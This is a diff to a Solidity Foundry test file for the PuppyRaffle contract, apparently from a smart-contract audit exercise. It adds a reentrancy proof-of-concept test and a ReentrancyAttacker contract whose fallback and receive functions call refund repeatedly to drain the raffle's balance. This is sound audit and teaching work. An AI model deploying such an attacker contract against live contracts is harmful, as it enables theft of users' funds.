@@ -211,7 +211,7 @@ contract PuppyRaffleTest is Test {
     }
 
     /*//////////////////////////////////////////////////////////////
-                    PROOF OF CODE - DENIAL OF SERVICE
+                    PROOF OF CODE: DENIAL OF SERVICE
     //////////////////////////////////////////////////////////////*/
 
     function test_denialOfService() public {
@@ -250,5 +250,83 @@ contract PuppyRaffleTest is Test {
         console.log("Gas used for second round 1000 players: ", gasUsedSecond);
 
         assert(gasUsedFirst < gasUsedSecond);
+    }
+
+    /*//////////////////////////////////////////////////////////////
+                    PROOF OF CODE: REENTRANCY ATTACK
+    //////////////////////////////////////////////////////////////*/
+
+    function test_ReentrancyRefund() public {
+        address[] memory players = new address[](4);
+        players[0] = playerOne;
+        players[1] = playerTwo;
+        players[2] = playerThree;
+        players[3] = playerFour;
+        puppyRaffle.enterRaffle{value: entranceFee * 4}(players);
+
+        ReentrancyAttacker attackerContract = new ReentrancyAttacker(
+            puppyRaffle
+        );
+        address attackUser = makeAddr("attackUser");
+        vm.deal(attackUser, 1 ether);
+
+        uint256 startingAttackerContractBalance = address(attackerContract)
+            .balance;
+        uint256 startingContractBalance = address(puppyRaffle).balance;
+
+        // attack
+        vm.prank(attackUser);
+        attackerContract.attack{value: entranceFee}();
+        console.log(
+            "starting attacker contract balance: ",
+            startingAttackerContractBalance
+        );
+        console.log("starting contract balance: ", startingContractBalance);
+        console.log(
+            "attacker contract balance after attack: ",
+            address(attackerContract).balance
+        );
+        console.log(
+            "contract balance after attack: ",
+            address(puppyRaffle).balance
+        );
+    }
+}
+
+/*//////////////////////////////////////////////////////////////
+                    REENTRANCY ATTACK CONTRACT
+     //////////////////////////////////////////////////////////////*/
+
+contract ReentrancyAttacker {
+    PuppyRaffle puppyRaffle;
+    uint256 entranceFee;
+    uint256 attackerIndex;
+
+    constructor(PuppyRaffle _puppyRaffle) {
+        puppyRaffle = _puppyRaffle;
+        entranceFee = puppyRaffle.entranceFee();
+    }
+
+    function attack() external payable {
+        address[] memory players = new address[](1);
+        players[0] = address(this);
+        puppyRaffle.enterRaffle{value: entranceFee}(players);
+
+        attackerIndex = puppyRaffle.getActivePlayerIndex(address(this));
+        puppyRaffle.refund(attackerIndex);
+    }
+
+    function _stealMoney() internal {
+        if (address(puppyRaffle).balance >= entranceFee) {
+            puppyRaffle.refund(attackerIndex);
+        }
+    }
+
+    fallback() external payable {
+        _stealMoney();
+    }
+
+    receive() external payable {
+        _stealMoney();
     }
 }
